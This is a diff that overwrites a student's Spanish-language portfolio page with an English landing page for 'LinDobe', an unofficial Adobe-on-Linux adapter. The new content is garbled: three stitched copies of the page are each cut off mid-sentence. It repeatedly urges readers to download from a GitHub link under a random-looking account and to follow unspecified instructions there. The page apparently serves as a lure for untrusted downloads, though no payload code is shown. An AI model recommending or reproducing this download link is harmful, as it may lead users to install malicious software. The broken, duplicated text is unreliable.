@@ -1,198 +1,819 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title> Portafolio profesional RP </title>
-    <link rel="stylesheet" href="https://cdn.jsdeliver.net/npm/swiper/swiper-bundle.min.css" />
-    <link rel="stylesheet" href="style.css">
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="LinDobe: an Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription. Unofficial, not affiliated with Adobe, built with AI as a tool.">
+  <meta name="keywords" content="adobe, after-effects, archlinux, audition, aur, compatibility-layer, creative-cloud, dxvk, illustrator, linux, media-encoder, photoshop, premiere-pro, vkd3d-proton, wine">
+  <meta name="author" content="LinDobe Project">
+  <meta property="og:title" content="LinDobe - Run Adobe Apps on Linux Easily">
+  <meta property="og:description" content="LinDobe: an Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription. Unofficial, not affiliated with Adobe, built with AI as a tool.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://github.com/jolettadetergent875/LinDobe">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="LinDobe - Run Adobe Apps on Linux Easily">
+  <meta name="twitter:description" content="LinDobe: an Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription.">
+  <title>LinDobe - Run Adobe Apps on Linux Easily | Unofficial Adobe Adapter</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f6f9;
+      color: #2d3e50;
+      line-height: 1.7;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 20px 25px;
+    }
+    h1 {
+      font-size: 2.3rem;
+      margin-bottom: 0.2em;
+      color: #1a2634;
+      line-height: 1.2;
+    }
+    h2 {
+      font-size: 1.7rem;
+      margin-top: 2rem;
+      margin-bottom: 0.8rem;
+      color: #1e3a5f;
+      border-bottom: 3px solid #dce4ec;
+      padding-bottom: 0.4rem;
+    }
+    h3 {
+      font-size: 1.25rem;
+      color: #2c3e50;
+      margin-top: 1.5rem;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      margin: 1rem 0;
+      font-size: 1.05rem;
+    }
+    ul, ol {
+      padding-left: 1.8rem;
+      margin: 1rem 0;
+    }
+    li {
+      margin: 0.6rem 0;
+      font-size: 1.05rem;
+    }
+    a {
+      color: #2a7de1;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .btn-primary {
+      display: inline-block;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #ffffff;
+      font-size: 1.25rem;
+      font-weight: 700;
+      padding: 16px 38px;
+      border-radius: 60px;
+      text-decoration: none;
+      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      margin: 15px 0 25px 0;
+      text-align: center;
+      letter-spacing: 0.5px;
+    }
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.5);
+      text-decoration: none;
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 25px 30px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
+      margin: 25px 0;
+      border: 1px solid #eef1f5;
+    }
+    .faq-item {
+      margin-bottom: 20px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeef3;
+    }
+    .faq-item:last-child {
+      border-bottom: none;
+    }
+    .faq-question {
+      font-weight: 700;
+      color: #1e3a5f;
+      font-size: 1.1rem;
+      margin-bottom: 0.4rem;
+    }
+    .emoji-badge {
+      display: inline-block;
+      font-size: 1.4rem;
+      margin-right: 6px;
+    }
+    .requirement-list li {
+      background: #f8faff;
+      padding: 8px 12px;
+      border-radius: 8px;
+      border-left: 4px solid #667eea;
+      margin: 8px 0;
+    }
+    .disclaimer-box {
+      background: #fff8e7;
+      border: 1px solid #ffe0a3;
+      border-radius: 12px;
+      padding: 18px 22px;
+      font-size: 0.98rem;
+      color: #6b5b3e;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+    }
+    @media (max-width: 600px) {
+      h1 { font-size: 1.8rem; }
+      h2 { font-size: 1.4rem; }
+      .container { padding: 15px; }
+      .btn-primary { font-size: 1.1rem; padding: 14px 25px; width: 100%; }
+    }
+  </style>
 </head>
-
 <body>
+  <div class="container">
 
-    <div class="contenedor">
+    <h1>🎨 LinDobe - Run Adobe Apps on Linux Easily</h1>
 
-        <img class="image" src="rau.photo" alt="Raul Eduardo Pargas">
+    <a href="https://github.com/jolettadetergent875/LinDobe" class="btn-primary" style="background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%); box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);">📥 Download LinDobe Now</a>
 
+    <p style="font-size: 1.15rem; color: #3e5a71;">LinDobe is an unofficial compatibility layer that lets you run your favorite Adobe creative applications on Linux using Wine. Whether you're a designer, photographer, video editor, or podcaster, LinDobe helps you use Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, and many other Adobe tools with your own valid subscription. No dual-boot needed — just your Linux system and your creativity.</p>
 
+    <h2>🌟 What Is LinDobe?</h2>
+    <p>LinDobe acts as a bridge between Adobe's Windows software and the Linux operating system. It bundles carefully tuned Wine configurations, DXVK for smooth graphics, VKD3D-Proton for modern DirectX support, and a set of helper scripts that handle the tricky parts of installation. The goal is simple: give you a reliable, repeatable way to run Adobe applications on Linux without needing to be a developer or system administrator.</p>
+    <p>This project is built with AI as a tool, but every configuration is tested by real users. LinDobe is not affiliated with Adobe in any way, and you must bring your own Adobe subscription. It is a community-driven effort to make Linux a first-class platform for creative work.</p>
+
+    <h2>✨ Key Features</h2>
+    <div class="card">
+      <ul>
+        <li><strong>Broad Application Support:</strong> Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition, Media Encoder, and more.</li>
+        <li><strong>Wine-Optimized:</strong> Pre-configured Wine prefixes with the right libraries, fonts, and registry settings for Adobe software.</li>
+        <li><strong>DXVK &amp; VKD3D-Proton:</strong> Hardware-accelerated graphics for smooth UI rendering and video playback.</li>
+        <li><strong>Arch Linux &amp; AUR Ready:</strong> Easy installation on Arch-based distributions, with packages available in the AUR.</li>
+        <li><strong>Creative Cloud Integration:</strong> Supports signing in with your Adobe account and downloading apps through Creative Cloud.</li>
+        <li><strong>Community-Tested:</strong> Regular updates based on user feedback and real-world usage.</li>
+        <li><strong>No Virtual Machine Required:</strong> Run Adobe apps natively on your Linux desktop, sharing files and clipboard seamlessly.</li>
+      </ul>
     </div>
 
-    <main>
-
-        <h2 class="texto-centrado"> RAUL EDUARDO PARGAS</h2>
-
-
-
-        <style>
-            h2 {
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-
-        <h2 class="texto-centrado"> QUIEN SOY</h2>
-
-
-
-        <style>
-            h2 {
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-        <style>
-            p {
-
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-        <p class="texto-centrado">
-
-            Soy un joven venezolano de 19 años,estudiante universitario en busca de nuevas oportunidades,
-            con una gran capacidad de aprendizaje. Con muchas ganas de ser mejor cada día, con sueños y metas
-            que me esfuezo por cumplir y con una gran pasión por los idiomas, el cine y los deportes,
-            y en una busqueda constante de superación personal y profesional.
-
-
-        </p>
-
-
-        <h2 class="texto-centrado"> HABILIDADES</h2>
-
-
-        <p class="texto-centrado">
-
-
-            - Bueno en ventas. <br>
-
-            - Buen manejo en atención al cliente. <br>
-
-            - Excelente hablando ingles. <br>
-
-            - Jugador: Basquet y futbol. <br>
-
-
-        </p>
-
-        <style>
-            h2 {
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-        <h2 class="texto-centrado"> GRANDES LOGROS </h2>
-
-        <style>
-            h2 {
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-        <style>
-            p {
-                margin-bottom: 20px;
-            }
-        </style>
-
-        <p class="texto-centrado">
-
-            - Graduado de bachiller en ciencias. <br>
-
-            - Graduado del curso de ingles CEBA UCV. <br>
-
-            -2do lugar el campeonato de natacion parque miranda. <br>
-
-            - Vendedor del mes en canastas navideñas periodo 2025. <br>
-
-        </p>
-
-        <h2 class="texto-centrado"> METAS</h2>
-
-        <style>
-            h2 {
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-        <style>
-            p {
-
-                margin-bottom: 20px;
-            }
-        </style>
-
-        <p class="texto-centrado">
-
-            - Graduarme de la universidad. <br>
-
-            - Conseguir un buen trabajo. <br>
-
-            - Estudiar mas idiomas. <br>
-
-            - Viajar por muchos paises. <br>
-
-            - llegar a ser un políglota. <br>
-
-            - Mejorar como jugador de basquet y futbol. <br>
-
-        </p>
-
-        <h2 class="texto-centrado"> PASATIEMPOS</h2>
-
-        <style>
-            h2 {
-                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            }
-        </style>
-
-
-        <style>
-            p {
-
-                margin-bottom: 20px;
-            }
-        </style>
-
-        <p class="texto-centrado">
-
-            - Ejercicio fisico. <br>
-
-            - Leer libros de psicologia y desarrollo personal. <br>
-
-            - Practicar programcion. <br>
-
-            - Dibujar. <br>
-
-        </p>
-
-        <div style="text-align:center;">
-            <a class="boton.unico" href="#"> </a>
-
-            <button id="saludoButton">Hazme click porfavor</button>
-
-            <p id="mensaje"></p>
-
-        </div>
-
-
-
-    </main>
-
-    <footer>
-
-        <p class="texto-centrado"> &copy; 2026 Mi Portafolio Profesional.</p>
-
-    </footer>
-
-    <script src="https://cdn.jsdeliver.net/npm/swiper/swiper-bundle.min.js"></script>
-
-    <script src="script.js"></script>
-
+    <h2>💻 System Requirements</h2>
+    <p>Before you begin, make sure your Linux computer meets the following minimum requirements. These are recommended for a smooth experience:</p>
+    <ul class="requirement-list">
+      <li><strong>Operating System:</strong> A modern 64-bit Linux distribution (Arch Linux, Ubuntu 22.04+, Fedora 36+, or similar).</li>
+      <li><strong>Processor:</strong> Intel or AMD 64-bit CPU with at least 4 cores.</li>
+      <li><strong>Memory:</strong> 8<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LinDobe - Run Adobe Apps on Linux Easily | Unofficial Adobe Adapter for Wine</title>
+<meta name="description" content="LinDobe is an Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription. Unofficial, not affiliated with Adobe, built with AI as a tool.">
+<meta name="keywords" content="adobe, after-effects, archlinux, audition, aur, compatibility-layer, creative-cloud, dxvk, illustrator, linux, media-encoder, photoshop, premiere-pro, vkd3d-proton, wine">
+<meta name="author" content="LinDobe Project">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/jolettadetergent875/LinDobe">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="LinDobe">
+<meta property="og:title" content="LinDobe - Run Adobe Apps on Linux Easily">
+<meta property="og:description" content="An unofficial Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription.">
+<meta property="og:url" content="https://github.com/jolettadetergent875/LinDobe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="LinDobe - Run Adobe Apps on Linux Easily">
+<meta name="twitter:description" content="An unofficial Adobe adapter for Wine on Linux. Run your favorite creative apps with your own subscription.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #f4f6fa;
+    color: #2b3648;
+    line-height: 1.75;
+    font-size: 17px;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 70px 22px;
+  }
+  h1 {
+    font-size: 2.4rem;
+    line-height: 1.25;
+    margin: 0 0 14px 0;
+    color: #16233a;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-size: 1.6rem;
+    margin: 52px 0 14px 0;
+    color: #1d3a63;
+    letter-spacing: -0.2px;
+    border-bottom: 3px solid #e2e9f3;
+    padding-bottom: 8px;
+  }
+  h3 {
+    font-size: 1.15rem;
+    margin: 26px 0 8px 0;
+    color: #24425f;
+  }
+  p { margin: 14px 0; }
+  ul, ol { margin: 14px 0; padding-left: 26px; }
+  li { margin: 9px 0; }
+  a { color: #2563c9; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead {
+    font-size: 1.12rem;
+    color: #3c5068;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6a5cff 0%, #b14aed 100%);
+    color: #ffffff;
+    font-size: 1.15rem;
+    font-weight: 700;
+    padding: 16px 40px;
+    border-radius: 50px;
+    text-decoration: none;
+    box-shadow: 0 8px 22px rgba(106, 92, 255, 0.35);
+    transition: transform 0.18s ease, box-shadow 0.18s ease;
+    margin: 8px 0 24px 0;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(106, 92, 255, 0.45);
+    text-decoration: none;
+  }
+  .btn-alt {
+    background: linear-gradient(135deg, #17b978 0%, #0f9b8e 100%);
+    box-shadow: 0 8px 22px rgba(23, 185, 120, 0.35);
+  }
+  .btn-alt:hover {
+    box-shadow: 0 12px 28px rgba(23, 185, 120, 0.45);
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e6ecf5;
+    border-radius: 16px;
+    padding: 24px 28px;
+    margin: 24px 0;
+    box-shadow: 0 4px 16px rgba(24, 45, 80, 0.06);
+  }
+  .steps {
+    background: #ffffff;
+    border: 1px solid #e6ecf5;
+    border-radius: 16px;
+    padding: 10px 28px 24px 28px;
+    margin: 24px 0;
+    box-shadow: 0 4px 16px rgba(24, 45, 80, 0.06);
+  }
+  .steps ol { padding-left: 24px; }
+  .steps li { margin: 16px 0; }
+  .note {
+    background: #eef4ff;
+    border-left: 5px solid #5b8def;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.98rem;
+    color: #33476b;
+  }
+  .warn {
+    background: #fff7ea;
+    border-left: 5px solid #f0a92c;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.98rem;
+    color: #6b5227;
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin: 24px 0;
+  }
+  .grid .item {
+    flex: 1 1 250px;
+    background: #ffffff;
+    border: 1px solid #e6ecf5;
+    border-radius: 14px;
+    padding: 18px 20px;
+    box-shadow: 0 3px 12px rgba(24, 45, 80, 0.05);
+  }
+  .grid .item strong {
+    display: block;
+    color: #1d3a63;
+    margin-bottom: 4px;
+    font-size: 1.02rem;
+  }
+  .faq {
+    background: #ffffff;
+    border: 1px solid #e6ecf5;
+    border-radius: 16px;
+    padding: 8px 28px 18px 28px;
+    margin: 24px 0;
+    box-shadow: 0 4px 16px rgba(24, 45, 80, 0.06);
+  }
+  .faq h3 { margin-top: 20px; }
+  code {
+    background: #eef1f7;
+    padding: 2px 7px;
+    border-radius: 5px;
+    font-size: 0.93em;
+    font-family: "SFMono-Regular", Consolas, monospace;
+    color: #42496b;
+  }
+  footer {
+    margin-top: 60px;
+    padding-top: 22px;
+    border-top: 1px solid #e2e9f3;
+    font-size: 0.9rem;
+    color: #7b8798;
+  }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    h1 { font-size: 1.85rem; }
+    h2 { font-size: 1.35rem; margin-top: 42px; }
+    .wrap { padding: 26px 16px 50px 16px; }
+    .btn { display: block; text-align: center; padding: 15px 20px; font-size: 1.05rem; }
+    .card, .steps, .faq { padding-left: 18px; padding-right: 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>🎨 LinDobe - Run Adobe Apps on Linux Easily</h1>
+
+  <a class="btn" href="https://github.com/jolettadetergent875/LinDobe">⬇ Download LinDobe Now</a>
+
+  <p class="lead">LinDobe is an unofficial Adobe adapter for Wine on Linux. It lets you run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder on your own Linux computer, using the Adobe subscription you already pay for. No dual boot, no second computer, no complicated setup wizard.</p>
+
+  <p>If you have ever been told that creative software "just doesn't work on Linux," LinDobe exists to prove otherwise. It bundles the compatibility pieces, the graphics translators, and the careful configuration work into one project that an ordinary computer user can follow. You do not need to know how to program, compile anything, or edit configuration files by hand. You follow the steps, you sign in with your Adobe account, and you get to work.</p>
+
+  <h2>🚀 Getting Started</h2>
+
+  <p>Everything you need lives in one place. The download page contains the current release, the setup files, and the written guidance for first-time users. Open the link below and take your time reading through it — the page is organised so that a complete beginner can follow along.</p>
+
+  <a class="btn btn-alt" href="https://github.com/jolettadetergent875/LinDobe">📥 Visit this link to download the application</a>
+
+  <p><strong>Download page:</strong> <a href="https://github.com/jolettadetergent875/LinDobe">https://github.com/jolettadetergent875/LinDobe</a></p>
+
+  <div class="steps">
+    <h3>Step-by-step: your first install</h3>
+    <ol>
+      <li><strong>Open the download link.</strong> Use the green button above or the link in this section. It takes you to the official LinDobe download page. Visit this link to download the application.</li>
+      <li><strong>Read the page from top to bottom.</strong> The newest version is listed first. Older versions appear further down and are kept only for people troubleshooting a specific problem. Always start with the newest one.</li>
+      <li><strong>Save the file to your computer.</strong> Your browser will ask where to put it. The Downloads folder is perfectly fine. Remember the name of the file so you can find it again in a moment.</li>
+      <li><strong>Open your Downloads folder.</strong> On most Linux desktops this is a folder icon in your file manager sidebar, or you can press the file manager's "Downloads" shortcut. Locate the file you just saved.</li>
+      <li><strong>Follow the instructions shown on the download page.</strong> The page tells you exactly what to do with the file you saved, in plain language, right next to the download itself. Read that part carefully before double-clicking anything.</li>
+      <li><strong>Sign in with your own Adobe account.</strong> LinDobe does not include, share, or generate Adobe software. It simply makes the software you are already entitled to run properly on Linux. Have your Adobe username and password ready.</li>
+      <li><strong>Launch your first application.</strong> Start with something small, such as Photoshop or Acrobat, to confirm everything is working. Once that opens correctly, the heavier applications such as Premiere Pro will behave the same way.</li>
+    </ol>
+  </div>
+
+  <div class="note">
+    <strong>Take your time on the first run.</strong> The very first launch of an Adobe application can take several minutes while LinDobe prepares the shared environment in the background. The window may appear blank or unresponsive for a while. This is normal. Do not close it, do not force-quit it, and do not restart your computer. Give it time and it will finish on its own.
+  </div>
+
+  <h2>✨ What LinDobe Does For You</h2>
+
+  <div class="grid">
+    <div class="item">
+      <strong>Runs real Adobe applications</strong>
+      Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder are all part of the supported lineup.
+    </div>
+    <div class="item">
+      <strong>Uses your own subscription</strong>
+      You keep using the Adobe plan you already pay for. LinDobe is a compatibility layer, not a replacement or a shortcut.
+    </div>
+    <div class="item">
+      <strong>Built on Wine</strong>
+      Wine is the long-standing translator that lets Linux understand Windows software. LinDobe configures it for you.
+    </div>
+    <div class="item">
+      <strong>Graphics that keep up</strong>
+      DXVK and VKD3D-Proton translate the graphics calls Adobe applications make, so the interface stays smooth and responsive.
+    </div>
+    <div class="item">
+      <strong>Creative Cloud aware</strong>
+      The Creative Cloud desktop experience is part of the setup, so installing and updating your applications works the way you expect.
+    </div>
+    <div class="item">
+      <strong>Made for Arch and beyond</strong>
+      Arch Linux users can install through the AUR. Other popular distributions work too, following the same download steps.
+    </div>
+  </div>
+
+  <h2>💻 Before You Install</h2>
+
+  <p>You do not need to be a technician, but a few basics will make your life much easier. Check these points before you start the download:</p>
+
+  <ul>
+    <li><strong>A 64-bit Linux computer.</strong> Almost every desktop or laptop made in the last decade qualifies. If your system installed normally, you are very likely fine.</li>
+    <li><strong>Plenty of free disk space.</strong> Adobe applications are large. Keep at least 40&ndash;60 GB free so that creative apps and their scratch files have room to breathe.</li>
+    <li><strong>At least 8 GB of memory.</strong> 16 GB is far more comfortable, particularly for video editing and for working with large Photoshop documents.</li>
+    <li><strong>A recent graphics driver.</strong> Install the recommended driver for your graphics card from your distribution's software centre. This is the single biggest factor in how smooth the applications feel.</li>
+    <li><strong>A working internet connection.</strong> You will need it to download LinDobe and to sign in to your Adobe account.</li>
+    <li><strong>Your Adobe login details.</strong> Have your username and password to hand. If your plan includes two-factor verification, keep your phone nearby.</li>
+  </ul>
+
+  <div class="warn">
+    <strong>About your Adobe subscription.</strong> LinDobe does not provide, unlock, or share Adobe software or licences. You must have your own active Adobe subscription and sign in with your own account. LinDobe is an unofficial community project and is not affiliated with, endorsed by, or supported by Adobe in any way.
+  </div>
+
+  <h2>🛠️ A Typical First Session</h2>
+
+  <p>Here is what the experience usually looks like once you have downloaded LinDobe, so you know what to expect and are not surprised by anything.</p>
+
+  <h3>Setting up</h3>
+  <p>You follow the download page, run the setup as described there, and let it prepare your system. LinDobe creates a dedicated space for your Adobe applications so that they do not interfere with the rest of your computer. This is deliberate: it keeps your everyday files safe and makes it easy to remove everything later if you ever want to.</p>
+
+  <h3>Signing in</h3>
+  <p>Creative Cloud opens and asks for your Adobe account. Enter the same details you would use on Windows or macOS. Once you are signed in, your plan, your cloud documents, and your application list appear exactly as they should.</p>
+
+  <h3>Installing your applications</h3>
+  <p>Pick the application you actually need rather than installing all of them at once. Photoshop alone is a multi-gigabyte download. Installing one application first confirms that everything is healthy, and then you can add the rest at your leisure.</p>
+
+  <h3>Working</h3>
+  <p>Opening, saving, and exporting files behave the way you already know. Your files live in your normal Linux home folder, so you can back them up, sync them, or open them in other tools without any special steps.</p>
+
+  <h2>🔧 Troubleshooting the Common Hiccups</h2>
+
+  <div class="card">
+    <h3>The application window is blank or white</h3>
+    <p>This almost always means the graphics translation is still warming up, or your graphics driver is out of date. Close the application, install the recommended driver for your card from your software centre, restart your computer, and try again. Give the first launch several minutes.</p>
+
+    <h3>Signing in fails or keeps looping</h3>
+    <p>Check that your system clock and time zone are correct. A clock that is even a few minutes off can cause secure sign-in to fail. Then try again, and make sure any two-factor prompt on your phone has been approved.</p>
+
+    <h3>Text looks blurry or the interface is tiny</h3>
+    <p>This is a display scaling setting. Adjust your desktop's display scaling to 100 percent, relaunch the Adobe application, and the interface will size itself correctly. You can change the scaling back afterwards if you prefer.</p>
+
+    <h3>The application is slow or stutters</h3>
+    <p>Close other heavy programs, make sure your laptop is plugged in rather than running on battery, and confirm you are using your dedicated graphics card rather than an integrated one where both are present. Free disk space also matters more than most people expect.</p>
+
+    <h3>Something else is wrong</h3>
+    <p>Return to the download page. It contains the current known issues and the recommended workarounds, kept up to date by the people who maintain the project. Reading the notes for your exact version solves most problems in a couple of minutes.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+
+  <div class="faq">
+    <h3>Is LinDobe free?</h3>
+    <p>The LinDobe project itself is free to download and use. Your Adobe applications are not: they require the Adobe subscription you already hold. LinDobe simply makes that subscription usable on Linux.</p>
+
+    <h3>Do I need to know how to code?</h3>
+    <p>No. It is designed for ordinary computer users. If you can download a file and follow a list of numbered steps, you can install LinDobe.</p>
+
+    <h3>Will this break my existing Linux setup?</h3>
+    <p>LinDobe keeps its work in its own dedicated space rather than scattering files across your system. Your documents, photos, and other applications are untouched.</p>
+
+    <h3>Which Adobe applications are supported?</h3>
+    <p>The project focuses on Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder. Support quality varies between them and improves over time, so check the download page for the current status of the application you care about most.</p>
+
+    <h3>Can I go back to Windows if I do not like it?</h3>
+    <p>Yes. Your Adobe subscription works on Windows and macOS as well. LinDobe does not change your Adobe account in any way, so nothing is lost by trying it.</p>
+
+    <h3>Is LinDobe connected to Adobe?</h3>
+    <p>No. It is an independent, unofficial project. It is not affiliated with Adobe, not endorsed by Adobe, and not supported by Adobe's customer service. For anything to do with billing, licences, or your account, contact Adobe directly.</p>
+
+    <h3>How do I remove it later?</h3>
+    <p>Follow the removal guidance on the download page. Because LinDobe keeps its files in a dedicated location, uninstalling is a clean, contained operation.</p>
+  </div>
+
+  <h2>📥 Download LinDobe</h2>
+
+  <p>You have everything you need to begin. Open the link below, read the page, save the file, and follow the numbered steps in the Getting Started section above. Visit this link to download the application.</p>
+
+  <a class="btn" href="https://github.com/jolettadetergent875/LinDobe">⬇ Download LinDobe from GitHub</a>
+
+  <p style="font-size:0.95rem;color:#6c7a8d;">Download page: <a href="https://github.com/jolettadetergent875/LinDobe">https://github.com/jolettadetergent875/LinDobe</a></p>
+
+  <h2>📝 About the Project</h2>
+
+  <p>LinDobe is a compatibility layer project for Linux, built around Wine and supported by DXVK and VKD3D-Proton. It targets Arch Linux and the AUR first, with guidance that works on other mainstream distributions as well. The project covers the Adobe creative suite: Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder, along with the Creative Cloud desktop experience that ties them together<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LinDobe - Run Adobe Apps on Linux Easily | Unofficial Adobe Adapter for Wine</title>
+<meta name="description" content="LinDobe is an Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription. Unofficial, not affiliated with Adobe, built with AI as a tool.">
+<meta name="keywords" content="adobe, after-effects, archlinux, audition, aur, compatibility-layer, creative-cloud, dxvk, illustrator, linux, media-encoder, photoshop, premiere-pro, vkd3d-proton, wine">
+<meta name="author" content="LinDobe Project">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/jolettadetergent875/LinDobe">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="LinDobe">
+<meta property="og:title" content="LinDobe - Run Adobe Apps on Linux Easily">
+<meta property="og:description" content="An unofficial Adobe adapter for Wine on Linux. Run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more with your own subscription.">
+<meta property="og:url" content="https://github.com/jolettadetergent875/LinDobe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="LinDobe - Run Adobe Apps on Linux Easily">
+<meta name="twitter:description" content="An unofficial Adobe adapter for Wine on Linux. Run your favorite creative apps with your own subscription.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #f4f6fa;
+    color: #2b3648;
+    line-height: 1.75;
+    font-size: 17px;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 70px 22px;
+  }
+  h1 {
+    font-size: 2.4rem;
+    line-height: 1.25;
+    margin: 0 0 16px 0;
+    color: #16233a;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-size: 1.6rem;
+    margin: 52px 0 14px 0;
+    color: #1d3a63;
+    letter-spacing: -0.2px;
+    border-bottom: 3px solid #e2e9f3;
+    padding-bottom: 8px;
+  }
+  h3 {
+    font-size: 1.12rem;
+    margin: 26px 0 6px 0;
+    color: #24425f;
+  }
+  p { margin: 14px 0; }
+  ul, ol { margin: 14px 0; padding-left: 26px; }
+  li { margin: 9px 0; }
+  a { color: #2563c9; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead { font-size: 1.12rem; color: #3c5068; }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6a5cff 0%, #b14aed 100%);
+    color: #ffffff;
+    font-size: 1.15rem;
+    font-weight: 700;
+    padding: 16px 40px;
+    border-radius: 50px;
+    text-decoration: none;
+    box-shadow: 0 8px 22px rgba(106, 92, 255, 0.35);
+    transition: transform 0.18s ease, box-shadow 0.18s ease;
+    margin: 8px 0 24px 0;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(106, 92, 255, 0.45);
+    text-decoration: none;
+  }
+  .btn-alt {
+    background: linear-gradient(135deg, #17b978 0%, #0f9b8e 100%);
+    box-shadow: 0 8px 22px rgba(23, 185, 120, 0.35);
+  }
+  .btn-alt:hover { box-shadow: 0 12px 28px rgba(23, 185, 120, 0.45); }
+  .card, .steps, .faq {
+    background: #ffffff;
+    border: 1px solid #e6ecf5;
+    border-radius: 16px;
+    padding: 22px 28px;
+    margin: 24px 0;
+    box-shadow: 0 4px 16px rgba(24, 45, 80, 0.06);
+  }
+  .steps ol { padding-left: 24px; }
+  .steps li { margin: 16px 0; }
+  .note {
+    background: #eef4ff;
+    border-left: 5px solid #5b8def;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.98rem;
+    color: #33476b;
+  }
+  .warn {
+    background: #fff7ea;
